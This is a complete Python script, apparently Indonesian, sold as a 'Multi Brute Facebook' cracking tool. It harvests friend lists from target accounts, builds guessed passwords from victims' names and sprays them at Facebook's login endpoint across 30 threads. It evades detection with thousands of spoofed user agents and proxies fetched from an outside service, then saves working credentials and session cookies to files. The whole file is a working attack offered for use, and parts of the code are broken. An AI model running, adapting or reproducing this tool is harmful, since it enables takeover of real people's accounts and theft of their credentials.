
###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from time import time as TimeTegar
from rich.tree import Tree
from rich import print as prints
from bs4 import BeautifulSoup as parser
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
tokenku = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
ualu,ualuh = [],[]
CON=sol()
ugen = []

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	print(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
for xd in range(10000):
    rr = random.randint; rc = random.choice
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    uateddy = random.choice([strvgt])
    ugen.append(uateddy)
    
# UGENT ZXMPL#
ugen1 = []
for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(43,120)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"])
	opera = random.choice(["SAMSUNG-GT-C3590","SAMSUNG-GT-C3312","SAMSUNG-GT-E2202","SAMSUNG-GT-S3802","SAMSUNG-GT-C3262","SAMSUNG-GT-E1282T","SAMSUNG-GT-E2252"])
	#zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	#zax4=f'{opera} Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	zax5=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax6 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax7=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	main_ua = random.choice([zax5,zax2,zax6,zax3,zax7])
	ugen1.append(main_ua)
	
# TAHUN MAJAPAHIT #
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def alvino_xy(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def clear():
    os.system('clear')


def back():
    login()
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''{asu}
┏┓┳┓┏┓┏┓┏┓ ┏┓┏┓┳┓
┃┓┣┫┣ ┣ ┏┛  ┃┃ ┃┃©
┗┛┛┗┗┛┗┛┗┛ ┗┛┗┛┻┛
                  
                  
{asu}MULTI BRUTE FACEBOOK VERSION 3.5 ®
USER : {k}>> {h}[ 1 USER ONLINE ]{k}<<{asu}
AUTHOR : {k}>> {h}[ GREEZ XD ] {k} <<{asu}
WA AUTHOR : {k}>> {h}[ +6285697075823 ] {k}<<{asu}
LISENSI MU : {k}>> {h}[ 555566666222113333777 ] {k}<<{asu}
LAST UPDATE..........{x}
''')

#kukis
def login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get(
                'https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('◉━━─ ConnectionError')
            exit()
    except IOError:
        login_lagi334()


def login_lagi334():
    try:
        os.system('clear')
        banner()
        ses = requests.Session()
        cok = input('\n◉━━─ input your cookie : ')
        ses.headers.update(
            {
                'content-type': 'application/x-www-form-urlencoded',
            }
        )
        data = {
            'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
            'scope': ''
        }
        response = json.loads(
            ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
        code, user_code = response['code'], response['user_code']
        verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), (
            'https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
        ses.headers.pop(
            'content-type'
        )
        ses.headers.update(
            {
                'sec-fetch-mode': 'navigate',
                'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                'sec-fetch-site': 'cross-site',
                'Host': 'm.facebook.com',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-dest': 'document',
            }
        )
        response2 = ses.get(verification_url, cookies={'cookie': cok}).text
        if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
            exit('\n◉━━─ Cookies Invalid my brother')
        else:
            action = re.search('action="(.*?)">', str(response2)
                               ).group(1).replace('amp;', '')
            fb_dtsg = re.search(
                'name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
            jazoest = re.search(
                'name="jazoest" value="(\d+)"', str(response2)).group(1)
            data = {
                'fb_dtsg': fb_dtsg,
                'jazoest': jazoest,
                'qr': 0,
                'user_code': user_code,
            }
            ses.headers.update(
                {
                    'origin': 'https://m.facebook.com',
                    'referer': verification_url,
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-fetch-site': 'same-origin',
                }
            )
            response3 = ses.post(
                'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok})
            if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                ses.headers.pop(
                    'content-type'
                )
                ses.headers.pop(
                    'origin'
                )
                response4 = ses.post(response3.url, data=data, cookies={
                                     'cookie': cok}).text
                action = re.search(
                    'action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                fb_dtsg = re.search(
                    'name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                jazoest = re.search(
                    'name="jazoest" value="(\d+)"', str(response4)).group(1)
                scope = re.search('name="scope" value="(.*?)"',
                                  str(response4)).group(1)
                display = re.search(
                    'name="display" value="(.*?)"', str(response4)).group(1)
                user_code = re.search(
                    'name="user_code" value="(.*?)"', str(response4)).group(1)
                logger_id = re.search(
                    'name="logger_id" value="(.*?)"', str(response4)).group(1)
                auth_type = re.search(
                    'name="auth_type" value="(.*?)"', str(response4)).group(1)
                encrypted_post_body = re.search(
                    'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                return_format = re.search(
                    'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                ses.headers.update(
                    {
                        'origin': 'https://m.facebook.com',
                        'referer': response3.url,
                        'content-type': 'application/x-www-form-urlencoded',
                    }
                )
                data = {
                    'fb_dtsg': fb_dtsg,
                    'jazoest': jazoest,
                    'scope': scope,
                    'display': display,
                    'user_code': user_code,
                    'logger_id': logger_id,
                    'auth_type': auth_type,
                    'encrypted_post_body': encrypted_post_body,
                    'return_format[]': return_format,
                }
                response5 = ses.post(
                    'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok}).text
                windows_referer = re.search(
                    'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                ses.headers.pop(
                    'content-type'
                )
                ses.headers.pop(
                    'origin'
                )
                ses.headers.update(
                    {
                        'referer': 'https://m.facebook.com/',
                    }
                )
                response6 = ses.get(windows_referer, cookies={
                                    'cookie': cok}).text
                if 'Sukses!' in str(response6):
                    ses.headers.update(
                        {
                            'sec-fetch-mode': 'no-cors',
                            'referer': 'https://graph.facebook.com/',
                            'Host': 'graph.facebook.com',
                                    'accept': '*/*',
                                    'sec-fetch-dest': 'script',
                                    'sec-fetch-site': 'cross-site',
                        }
                    )
                    response7 = ses.get(status_url, cookies={
                                        'cookie': cok}).text
                    tok = re.search('"access_token": "(.*?)"',
                                    str(response7)).group(1)
                    tokenw = open(".token.txt", "w").write(tok)
                    cokiew = open(".cok.txt", "w").write(cok)
                    print(
                        f"\n◉━━─ Login was successful, re-execute my brother's command")
                else:
                    exit('\n◉━━─ login failed my brother')

    except Exception as e:
        print('\n◉━━─ Cookies Invalid my brother')
        os.system('rm -rf .emailbukan.txt && rm -rf .akunbukan.txt')
        print(e)
        exit()

###----------[ BAGIAN MENU ]----------###
def menu(my_name, my_id):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        print('◉━━─ Cookies Invalid my brother ')
        time.sleep(5)
        login_lagi334()
    os.system('clear')
    banner()
    print(f'╭────────────────────')
    print(f'{xxx} 1. FB CRACK')
    print(f'{xxx} 2. KELUAR {m}[ HAPUS KOOKIE ]{xxx}')
    print('╰────────────────────')
    _____Dwi__Yantti_____ = input(f'\n└──C PILIH: ')
    if _____Dwi__Yantti_____ in ['1']:
        nge_krek()
    elif _____Dwi__Yantti_____ in ['2']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print(f'╭────────────────────')
        print(f'{xxx} Success logout')
        exit()
    else:
        exit()

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
        dwi = int(input(f"└──C BERAPA ID YG MAU DI KRECK ?:  "))
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f"└──C MASUKKIN ID KE {_dwi_}: ")
        uid.append(Masukan)
    for user in uid:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print(f"└──C <(｡⁠◕⁠‿⁠◕⁠｡)⁠> ID TERKUMPUL : " +str(len(id)))
        atur_dulu()
    except requests.exceptions.ConnectionError:
        print(f"{T}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f"{T}{M}  teman tidak publik")
        exit()
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'╭────────────────────')
	print(' 1. JANDA')
	print(' 2. GADIS')
	print(' 3. BENCONG')
	print(f'╰────────────────────')
	aturid = input(f'{xxx}└──C PILIH : ')
	print(f'╭────────────────────')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	print(' 1. METODH GREEZ')
	metod = input(f'{xxx}└──C KETIK 1 : ')
	print(f'╭──────────────────────────────────────')
	print(f'└──C {h}MENUNGGU MEMANG GAENAK HARAP BERSABAR')
	if metod in ['1','01']:
		baz.append('metod1')
	else:
		baz.append('metod1')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global ok,cp
	print(f'{xxx}')
	awal = datetime.datetime.now()
	with tred(max_workers=30) as gas_krek:
		for aldous in id2:
			idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			pwt = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			if '><v><' in pwt:
				for xpwn in pwn:
					pwv.append(xpwn)
			else:pass
			if 'metod1' in baz:
				gas_krek.submit(metod1,idf,pwv,awal)
			else:
				gas_krek.submit(metod1,idf,pwv)
	print(f'{xxx}')
	print(f'{hijo}+ {puti}Akun LIVE  : {hijo}%s{xxx} '%(ok))
	print(f'{kun}+ {puti}Akun CHEK  : {kun}%s{xxx} '%(cp))
	print(f'{xxx}')
		
###----------[ METODE ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	sys.stdout.write(f" GREEZXD [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": idf,
				"next": "https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=3618539641590455&cbt=1696752891275&e2e=%7B%22init%22%3A1696752891275%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=26963441-e2bf-496f-97bf-2c6623861aed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22e971aba2-6f14-44d0-98d3-44be37e9c6c8%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22plim8mlau0dci6b51tc1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.netease.partyglobal&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=bZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo&ret=login&fbapp_pres=0&logger_id=e971aba2-6f14-44d0-98d3-44be37e9c6c8&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(TimeTegar()).split('.')[0]}:{pw}",
			}
			hider = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{kun}{idf} {pw}{xxx}")
				tree.add(f"\r{mer}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('LIVE/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"⌲ ID : {hijo}{idf}{puti}")
				tree.add(f"⌲ Password: {hijo}{pw}{puti}")
				tree.add(f"⌲ Tahun Account: {mer}{tahun(idf)}{puti}")
				tree.add(f"⌲ CokiCoki: {hijo}{kuki}{puti}")
				tree.add(f"⌲ {hijo}{ua}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == '__main__':
    try:
        os.system('git pull')
    except:
        pass
    try:
        os.mkdir('LIVE')
    except:
        pass
    try:
        os.mkdir('CHEK')
    except:
        pass
    try:
        os.mkdir('DUMP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
    login()
